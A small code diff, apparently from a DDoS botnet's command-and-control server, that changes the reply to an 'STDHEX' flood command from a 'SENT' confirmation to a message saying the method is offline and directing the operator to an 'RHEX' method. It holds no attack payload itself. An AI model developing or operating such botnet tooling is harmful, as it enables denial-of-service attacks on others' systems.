@@ -1154,7 +1154,7 @@ void *BotWorker(void *sock) {
         if (strstr(buf, ". STDHEX"))
         {
             char udphexsent [500];
-            sprintf(udphexsent, "\033[37mUDPHEX Flood \033[32m SENT\033[37m...\r\n");
+            sprintf(udphexsent, "\033[37mSTDHEX Method \033[1;91m OFFLINE\033[37m. Use \033[1;92m. RHEX\r\n");
             if (send(datafd, udphexsent, strlen(udphexsent), MSG_NOSIGNAL) == -1) goto end;
         }
 
